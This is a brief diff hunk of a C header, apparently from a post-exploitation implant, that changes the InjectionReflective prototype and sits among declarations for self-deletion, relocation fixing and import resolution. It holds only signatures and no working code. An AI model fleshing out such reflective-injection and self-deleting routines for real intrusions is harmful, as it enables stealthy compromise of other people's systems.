@@ -248,7 +248,7 @@ EXTERN_C VOID volatile ___chkstk_ms(
 BOOL  SelfDeletion( void );
 BOOL  FixRelocTable( _In_ PIMAGE_DATA_DIRECTORY EntryReloc, _In_ UINT64 BaseAddress, _In_ UINT64 RelocOffset );
 BOOL  ResolveIat( _In_ PIMAGE_DATA_DIRECTORY EntryImport, _In_ UINT64 BaseAddress );
-PVOID InjectionReflective( _In_ HANDLE ProcessHandle, _In_ PBYTE PeBytes, _In_ UINT64 PeSize, _In_ PSTR Args, _In_ BOOL IsDll );
+PVOID InjectionReflective( _In_ HANDLE ProcessHandle, _In_ PBYTE PeBytes, _In_ UINT64 PeSize, _In_ PSTR Args );
 
 /*============================[ Memory ]============================*/
 
